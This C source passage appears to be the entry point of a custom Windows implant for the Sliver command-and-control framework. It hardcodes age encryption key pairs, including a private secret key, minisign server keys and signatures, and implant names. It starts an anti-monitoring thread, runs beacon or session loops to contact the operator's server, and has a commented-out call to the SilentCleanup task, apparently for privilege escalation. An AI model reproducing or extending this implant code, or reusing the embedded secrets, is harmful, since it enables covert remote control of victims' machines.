	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+W4BCidBiGftXn3B5BhF2iTvOKLITSXl8VuKkPw/0kWDwiDbrkvg9jbNmZD1bAkFCUpMtvri+4OsKLESnwmDuAs=\ntrusted comment: timestamp:1730337887\nxCTWnliJrfPawWnUmTY2P7ccJRZSa6LnyjMEdZCgEhef02WbBJh8RfMsz/I/ZrmPtpCNc1F4n2U+kghilIuzDA==";
	CHAR szSliverClientName[] = "TECHNICAL_FORAY";
	CHAR szConfigId[] = "5559e761-e90c-4b5e-893d-58eb247aa086";*/

	// From Tu Dinh
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
#endif

#ifndef _DEBUG
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectMonitorSystem, NULL, 0, &dwThreadId);
	if (hThread == NULL) {
		LOG_ERROR("CreateThread", GetLastError());
		goto CLEANUP;
	}
#endif

	pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
	pGlobalConfig->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
	pGlobalConfig->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
	pGlobalConfig->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
	pGlobalConfig->lpConfigID = DuplicateStrA(szConfigId, 0);
	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
	pGlobalConfig->uEncoderNonce = uEncoderNonce;
	pGlobalConfig->dwMaxFailure = dwMaxFailure;
	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	pGlobalConfig->uPeerID = GeneratePeerID();
#ifdef _BEACON
	pBeaconClient = BeaconInit(pGlobalConfig);
	BeaconMainLoop(pBeaconClient);
#elif _SESSION
	pSessionClient = SessionInit(pGlobalConfig);
	SessionMainLoop(pSessionClient);
#else
	pSessionClient = SessionInit(pGlobalConfig);
	SessionMainLoop(pSessionClient);
#endif
CLEANUP:
	if (hThread != NULL) {
#ifndef _DEBUG
		TerminateThread(hThread, 0);
#endif
		CloseHandle(hThread);
	}

#ifdef _BEACON
	FreeBeaconClient(pBeaconClient);
#else
	//FreeSessionClient(pSessionClient);
#endif
}

LONG VectoredExceptionHandler
(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

	PrintFormatW(L"Exception Code: 0x%08x\n", dwExpceptionCode);
	PrintStackTrace(ExceptionInfo->ContextRecord);
	ExitProcess(-1);
}

int main(void) {
	RtlAddVectoredExceptionHandler(1, VectoredExceptionHandler);
	LoadLibraryW(L"advapi32.dll");
	LoadLibraryW(L"bcrypt.dll");
	LoadLibraryW(L"combase.dll");
	LoadLibraryW(L"crypt32.dll");
	LoadLibraryW(L"dbghelp.dll");
	LoadLibraryW(L"gdi32full.dll");
	LoadLibraryW(L"IPHLPAPI.dll");
	LoadLibraryW(L"ole32.dll");
	LoadLibraryW(L"oleaut32.dll");
	LoadLibraryW(L"rpcrt4.dll");
	LoadLibraryW(L"sechost.dll");
	LoadLibraryW(L"shlwapi.dll");
	LoadLibraryW(L"verifier.dll");
	LoadLibraryW(L"vrfcore.dll");
	LoadLibraryW(L"win32u.dll");
	LoadLibraryW(L"winhttp.dll");
	LoadLibraryW(L"wtsapi32.dll");
	LoadLibraryW(L"RPCRT4.dll");
	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
	//test1();
	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test3(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test5();
	//test6();
	//test7();
	//test8();
	//test9();
	//test10();
	//test11();
	//test12();
	//test13();
	//test14();
	//test15();
	//test16();
	//test17();
	//test18();
	//test19();
	//test20();
	//test21("C:\\Windows\\System32\\cmd.exe");
	//test22();
	//test23();
	//test24();
	//test25();
	//test26();
	//test27();
	//test28();
	//test29();
	//test30();
	//test31();
	//test32();
	//test33();
	//test34();
	//test35();
	//test36();
	//test37();
	//test38();
	//test39();
	//test40();
	//test41();
	//test42();
	//test43();
	//test44();
	//test45();
	//test46();
	//test47();
	//test48();
	//test49();
	//test50();
	//test51();
	//test52();
	//test53();
	//test54();
	//test55();
	//test56();
	//test57();
	//test58();
	//test59();
	//test60();
	//test61();
	//test62();
	//test64();
	//test65();
	//test66();
	//test67();
	//test68();
	//test69();
	//test70();
	//test71();
	//test72();
	//test73();
	//test74();
	//test75();
	//test76();
	//test77();
	//test78();
	//test79();
	//test80();
	//test81();
	//test82();
	//test83();
	//test84();
	//test85();
	//test86();
	//test87();
	//test88();
	//test89();
	//test90();
	//test91();
	//test92();
	//test93();
	//test94();
	//test95();
	//test96();
	//test97();
	//test98();
	//test99();
	//test100();
	//test101();
	//test102();
	//test103();
	//test104();
	//test105();
	//test106();
	//test108();
	//test109();
	//test110();
	//test111();
	//test112();
	//test113();
	//test114();
	//test115();
	//test116();
	//test117();
	//test118();
	//test119();
	//test120();
	//test121();
	//test122();
	Final();

	return 0;
}